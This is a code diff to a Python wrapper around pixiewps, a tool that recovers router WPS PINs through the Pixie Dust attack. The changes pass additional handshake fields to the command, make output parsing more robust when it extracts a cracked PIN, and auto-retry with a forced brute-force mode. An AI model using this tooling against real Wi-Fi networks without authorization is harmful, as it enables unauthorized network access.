@@ -4485,6 +4485,11 @@ class PixiewpsData:
                 and len(self.e_hash1) ==  32 * 2
                 and len(self.e_hash2) ==  32 * 2)
 
+    def all_ok(self) -> bool:
+        """Alias for got_all() to preserve backward compatibility."""
+        return self.got_all()
+
+
     def got_all_wps2(self) -> bool:
         """True when all standard fields AND at least one WPS 2.0 extended
         field (R-Hash1/2 or KDF Key) are present -- signals a full WPS 2.0
@@ -4546,6 +4551,14 @@ class PixiewpsData:
             parts += ['--authkey', self.authkey]
         if self.e_nonce:
             parts += ['--e-nonce', self.e_nonce]
+        if self.r_nonce:
+            parts += ['--r-nonce', self.r_nonce]
+        if self.r_hash1:
+            parts += ['--r-hash1', self.r_hash1]
+        if self.r_hash2:
+            parts += ['--r-hash2', self.r_hash2]
+        if self.e_bssid:
+            parts += ['--bssid',   self.e_bssid]
         if mode is not None:
             parts += ['--mode', str(mode)]
         if full_range:
@@ -5186,6 +5199,8 @@ class Companion:
 
         def _extract_pin(stdout: str):
             """Extract WPS PIN from pixiewps stdout across all known output formats."""
+            if not stdout:
+                return None
             for ln in stdout.splitlines():
                 sl = ln.lower()
                 if 'pin' not in sl or ':' not in ln:
@@ -5220,23 +5235,26 @@ class Companion:
             """Run pixiewps silently; return (stdout, might_vulnerable)."""
             r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
-            sl = r.stdout.lower()
+            out = r.stdout or ''
+            sl = out.lower()
             might = 'might' in sl and 'vulnerable' in sl
-            return r.stdout, might
+            return out, might
 
         cmd = self.pixie_creds.get_pixie_cmd(full_range)
         if showcmd:
             print(cmd)
         r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                            stderr=sys.stdout, encoding='utf-8', errors='replace')
-        print(r.stdout)
-        pin = _extract_pin(r.stdout)
+        out_text = r.stdout or ''
+        if out_text.strip():
+            print(out_text)
+        pin = _extract_pin(out_text)
         if pin:
             return pin
 
         # Detect "might be vulnerable" — AP needs --force (brute-force wider seed range).
         # Auto-retry once with --force so the user doesn't have to know about this flag.
-        stdout_lower = r.stdout.lower()
+        stdout_lower = out_text.lower()
         might_vulnerable = ('might' in stdout_lower and 'vulnerable' in stdout_lower)
         if might_vulnerable and not full_range:
             print(f'{warn} AP /might be/ vulnerable — auto-retrying Pixiewps with --force …')
@@ -5244,8 +5262,10 @@ class Companion:
             print(f'{info} {force_cmd}')
             r2 = subprocess.run(force_cmd, shell=True, stdout=subprocess.PIPE,
                                 stderr=sys.stdout, encoding='utf-8', errors='replace')
-            print(r2.stdout)
-            pin = _extract_pin(r2.stdout)
+            out_text2 = r2.stdout or ''
+            if out_text2.strip():
+                print(out_text2)
+            pin = _extract_pin(out_text2)
             if pin:
                 return pin
             # Still no PIN — give the user the exact command to retry manually with fresh data
